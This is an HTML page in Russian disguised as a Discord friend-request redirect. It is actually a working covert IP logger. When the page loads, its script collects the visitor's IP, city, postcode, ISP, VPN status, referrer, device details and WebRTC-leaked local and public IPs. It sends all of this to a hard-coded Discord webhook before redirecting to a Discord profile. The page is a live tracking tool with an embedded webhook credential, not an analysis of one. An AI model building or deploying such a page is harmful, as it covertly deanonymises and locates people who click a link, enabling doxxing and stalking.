<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Добавь в друзья Discord">
    <meta property="og:description" content="Нажми чтобы добавить в друзья">
    <meta name="theme-color" content="#5865F2">
    <title>Friend Request</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #5865F2, #404EED);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
            color: white;
            text-align: center;
        }
        .container { animation: fadeIn 0.5s ease; }
        .avatar {
            width: 100px; height: 100px; border-radius: 50%;
            border: 5px solid white; margin-bottom: 25px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        h2 { font-size: 24px; margin-bottom: 10px; }
        p { color: rgba(255,255,255,0.8); font-size: 16px; }
        .spinner {
            width: 40px; height: 40px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top-color: white; border-radius: 50%;
            animation: spin 0.8s linear infinite; margin: 25px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div class="container">
        <img class="avatar" src="https://cdn.discordapp.com/embed/avatars/0.png" alt="Avatar">
        <h2>👋 Перенаправляем в Discord...</h2>
        <p>Анализируем переход...</p>
        <div class="spinner"></div>
    </div>

    <script>
        async function collectAndRedirect() {
            try {
                // ======================
                // 1. ПОЛУЧАЕМ IP
                // ======================
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipRes.json();
                
                // ======================
                // 2. ГЕОЛОКАЦИЯ + VPN
                // ======================
                let geoData = {};
                try {
                    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                    geoData = await geoRes.json();
                } catch(e) {
                    try {
                        const geoRes2 = await fetch(`https://ipwhois.app/json/${ip}`);
                        geoData = await geoRes2.json();
                    } catch(e2) { geoData = { error: true }; }
                }
                
                let location = 'Не определена';
                if (!geoData.error) {
                    const parts = [];
                    if (geoData.city) parts.push(geoData.city);
                    if (geoData.region) parts.push(geoData.region);
                    if (geoData.country_name) parts.push(geoData.country_name);
                    if (parts.length > 0) location = parts.join(', ');
                }
                
                let vpnStatus = '✅ Обычное соединение';
                let vpnEmoji = '🟢';
                if (!geoData.error) {
                    const flags = [];
                    if (geoData.hosting) flags.push('Хостинг/Дата-центр');
                    if (geoData.proxy) flags.push('Прокси');
                    if (geoData.vpn) flags.push('VPN');
                    if (geoData.tor) flags.push('Tor');
                    if (flags.length > 0) { vpnStatus = '⚠️ ' + flags.join(', '); vpnEmoji = '🔴'; }
                }
                
                // ======================
                // 3. ОПРЕДЕЛЯЕМ ИСТОЧНИК ПЕРЕХОДА
                // ======================
                const referrer = document.referrer;
                let sourceInfo = '';
                let sourceEmoji = '';
                let sourceDetail = '';
                
                if (!referrer || referrer === '') {
                    sourceInfo = '🔗 Прямой переход (ссылку отправили в ЛС/чат)';
                    sourceEmoji = '💬';
                    sourceDetail = 'Скорее всего прислали в Discord, Telegram, WhatsApp или скопировали ссылку';
                } else if (referrer.includes('vk.com')) {
                    sourceInfo = '🟦 ВКонтакте';
                    sourceEmoji = '🟦';
                    sourceDetail = `Полная ссылка: ${referrer}\nВозможно из: ${referrer.includes('/im') ? 'Личные сообщения' : referrer.includes('/wall') ? 'Стена' : referrer.includes('/public') ? 'Группа' : 'Лента/Профиль'}`;
                } else if (referrer.includes('t.me') || referrer.includes('telegram.org')) {
                    sourceInfo = '✈️ Telegram';
                    sourceEmoji = '✈️';
                    sourceDetail = `Полная ссылка: ${referrer}\n${referrer.includes('/c/') ? 'Из канала' : referrer.includes('/chat/') ? 'Из чата' : 'Из личных сообщений'}`;
                } else if (referrer.includes('discord.com') || referrer.includes('discordapp.com')) {
                    sourceInfo = '🎮 Discord';
                    sourceEmoji = '🎮';
                    sourceDetail = `Полная ссылка: ${referrer}\n${referrer.includes('/channels/') ? 'С сервера/канала' : 'Из ЛС'}`;
                } else if (referrer.includes('youtube.com')) {
                    sourceInfo = '▶️ YouTube';
                    sourceEmoji = '▶️';
                    sourceDetail = `Полная ссылка: ${referrer}\nВозможно из комментариев или описания видео`;
                } else if (referrer.includes('instagram.com')) {
                    sourceInfo = '📷 Instagram';
                    sourceEmoji = '📷';
                    sourceDetail = `Полная ссылка: ${referrer}\nИз профиля/сторис/директ`;
                } else if (referrer.includes('whatsapp.com')) {
                    sourceInfo = '💚 WhatsApp';
                    sourceEmoji = '💚';
                    sourceDetail = 'Из чата WhatsApp';
                } else if (referrer.includes('twitter.com') || referrer.includes('x.com')) {
                    sourceInfo = '🐦 Twitter/X';
                    sourceEmoji = '🐦';
                    sourceDetail = `Полная ссылка: ${referrer}`;
                } else if (referrer.includes('facebook.com')) {
                    sourceInfo = '👤 Facebook';
                    sourceEmoji = '👤';
                    sourceDetail = `Полная ссылка: ${referrer}`;
                } else if (referrer.includes('google.com') || referrer.includes('google.ru')) {
                    sourceInfo = '🔍 Google Поиск';
                    sourceEmoji = '🔍';
                    sourceDetail = `Полная ссылка: ${referrer}\nЧеловек нашёл ссылку через поиск Google`;
                } else if (referrer.includes('yandex.ru')) {
                    sourceInfo = '🔍 Яндекс Поиск';
                    sourceEmoji = '🔍';
                    sourceDetail = `Полная ссылка: ${referrer}\nЧеловек нашёл ссылку через поиск Яндекса`;
                } else {
                    sourceInfo = '🌐 Другой источник';
                    sourceEmoji = '🌐';
                    sourceDetail = `Полная ссылка: ${referrer}`;
                }
                
                // ======================
                // 4. UTM-МЕТКИ (если есть)
                // ======================
                const urlParams = new URLSearchParams(window.location.search);
                const utmSource = urlParams.get('utm_source');
                const utmMedium = urlParams.get('utm_medium');
                const utmCampaign = urlParams.get('utm_campaign');
                let utmInfo = '';
                if (utmSource || utmMedium || utmCampaign) {
                    utmInfo = `🏷️ UTM: источник=${utmSource || 'нет'}, канал=${utmMedium || 'нет'}, кампания=${utmCampaign || 'нет'}`;
                }
                
                // ======================
                // 5. ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ
                // ======================
                const ua = navigator.userAgent;
                
                let browser = 'Неизвестный';
                let browserVersion = '';
                if (ua.includes('Edg/')) { browser = 'Edge'; browserVersion = ua.split('Edg/')[1].split('.')[0]; }
                else if (ua.includes('Chrome')) { browser = 'Chrome'; browserVersion = ua.split('Chrome/')[1].split('.')[0]; }
                else if (ua.includes('Firefox')) { browser = 'Firefox'; browserVersion = ua.split('Firefox/')[1].split('.')[0]; }
                else if (ua.includes('Safari')) { browser = 'Safari'; browserVersion = ua.split('Version/')[1].split('.')[0]; }
                
                let os = 'Неизвестная';
                let osVersion = '';
                if (ua.includes('Windows NT 10.0')) { os = 'Windows 10/11'; osVersion = '10/11'; }
                else if (ua.includes('Windows NT 6.3')) { os = 'Windows 8.1'; osVersion = '8.1'; }
                else if (ua.includes('Mac OS X')) { os = 'macOS'; const v = ua.match(/Mac OS X (\d+[._]\d+)/); osVersion = v ? v[1].replace('_', '.') : ''; }
                else if (ua.includes('Linux') && !ua.includes('Android')) { os = 'Linux'; }
                else if (ua.includes('Android')) { os = 'Android'; const v = ua.match(/Android (\d+\.\d+)/); osVersion = v ? v[1] : ''; }
                else if (ua.includes('iPhone') || ua.includes('iPad')) { os = 'iOS'; const v = ua.match(/OS (\d+_\d+)/); osVersion = v ? v[1].replace('_', '.') : ''; }
                
                let deviceModel = 'Не определена';
                if (ua.includes('iPhone')) { deviceModel = 'iPhone'; }
                else if (ua.includes('iPad')) { deviceModel = 'iPad'; }
                else if (ua.includes('Android')) { const match = ua.match(/; ([^;]+) Build/); deviceModel = match ? match[1].trim() : 'Android'; }
                
                const isMobile = /Mobile|Android|iPhone|iPad/i.test(ua);
                const isTablet = /iPad|Tablet/i.test(ua);
                const deviceType = isTablet ? '📱 Планшет' : (isMobile ? '📱 Телефон' : '🖥️ Компьютер');
                
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const language = navigator.language || 'Неизвестен';
                const screenRes = `${screen.width}x${screen.height}`;
                const cpuCores = navigator.hardwareConcurrency || 'Неизвестно';
                
                // ======================
                // 6. WEBRTC LEAK
                // ======================
                let webrtcIPs = [];
                try {
                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                    pc.createDataChannel('');
                    const offer = await pc.createOffer();
                    await pc.setLocalDescription(offer);
                    await new Promise((resolve) => {
                        pc.onicecandidate = (e) => {
                            if (!e.candidate) { resolve(); return; }
                            const ipMatch = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                            if (ipMatch && !webrtcIPs.includes(ipMatch[1])) webrtcIPs.push(ipMatch[1]);
                        };
                        setTimeout(resolve, 1000);
                    });
                    pc.close();
                } catch(e) {}
                
                // ======================
                // 7. COOKIES (повторный визит)
                // ======================
                let visitCount = 1;
                let isReturning = false;
                try {
                    const stored = localStorage.getItem('visit_count');
                    if (stored) {
                        visitCount = parseInt(stored) + 1;
                        isReturning = true;
                    }
                    localStorage.setItem('visit_count', visitCount);
                } catch(e) {}
                
                // ======================
                // 8. ФОРМИРУЕМ ОТЧЁТ
                // ======================
                const WEBHOOK = "https://discord.com/api/webhooks/1507909831678496848/6Hm-yFjHzRHElN-GRxDYMc5o3ILiiis_tdMu4GfTiwnScyQCFio5lHr5ou29Y2jVWCgF";
                
                const embed = {
                    title: `${isReturning ? '🔄 ПОВТОРНЫЙ' : '👀 НОВЫЙ'} ПОСЕТИТЕЛЬ!`,
                    description: `**Визит #${visitCount}** с этого устройства`,
                    color: isReturning ? 16776960 : 5814786,
                    fields: [
                        {
                            name: `━━━━━━ ${sourceEmoji} ИСТОЧНИК ПЕРЕХОДА ━━━━━━`,
                            value: `${sourceInfo}\n📝 ${sourceDetail}`,
                            inline: false
                        },
                        {
                            name: "━━━━━━ 🌍 ГЕОЛОКАЦИЯ ━━━━━━",
                            value: `📍 ${location}\n🏢 ${geoData.org || 'Неизвестный провайдер'}\n📮 ${geoData.postal || 'Индекс неизвестен'}\n🔗 IP: ||${ip}||`,
                            inline: false
                        },
                        {
                            name: "━━━━━━ 🔒 VPN СТАТУС ━━━━━━",
                            value: `${vpnEmoji} ${vpnStatus}\n🏢 ASN: ${geoData.asn || 'Неизвестно'}`,
                            inline: false
                        },
                        {
                            name: "━━━━━━ 🖥️ УСТРОЙСТВО ━━━━━━",
                            value: `${deviceType}\n📱 Модель: ${deviceModel}\n💻 ОС: ${os} ${osVersion}\n🌐 Браузер: ${browser} ${browserVersion}`,
                            inline: false
                        },
                        {
                            name: "━━━━━━ ⚙️ ТЕХНИЧЕСКОЕ ━━━━━━",
                            value: `🖥️ Экран: ${screenRes}\n🧠 CPU: ${cpuCores} ядер\n⏰ Часовой пояс: ${timezone}\n🌍 Язык: ${language}`,
                            inline: false
                        }
                    ],
                    footer: { text: "Friend Tracker • " + new Date().toLocaleString('ru-RU') },
                    timestamp: new Date().toISOString()
                };
                
                // UTM метки
                if (utmInfo) {
                    embed.fields.push({
                        name: "━━━━━━ 🏷️ UTM МЕТКИ ━━━━━━",
                        value: utmInfo,
                        inline: false
                    });
                }
                
                // WebRTC утечки
                if (webrtcIPs.length > 0) {
                    const localIPs = webrtcIPs.filter(ip => ip.startsWith('10.') || ip.startsWith('172.16.') || ip.startsWith('192.168.') || ip.startsWith('127.'));
                    const publicIPs = webrtcIPs.filter(ip => !localIPs.includes(ip));
                    let webrtcField = '';
                    if (localIPs.length > 0) webrtcField += `🏠 Локальные: ||${localIPs.join(', ')}||\n`;
                    if (publicIPs.length > 0) webrtcField += `⚠️ Утечка публичных: ||${publicIPs.join(', ')}||`;
                    if (webrtcField) {
                        embed.fields.push({
                            name: "━━━━━━ 🚨 УТЕЧКА WEBRTC ━━━━━━",
                            value: webrtcField,
                            inline: false
                        });
                    }
                }
                
                // ======================
                // 9. ОТПРАВЛЯЕМ
                // ======================
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ embeds: [embed] })
                });
                
                console.log('✅ Отчёт отправлен!');
                
            } catch(e) {
                console.log('Ошибка:', e.message);
            }
            
            setTimeout(() => {
                window.location.href = "https://discord.com/users/1473020726280847541";
            }, 2500);
        }
        
        collectAndRedirect();
    </script>
</body>
</html>
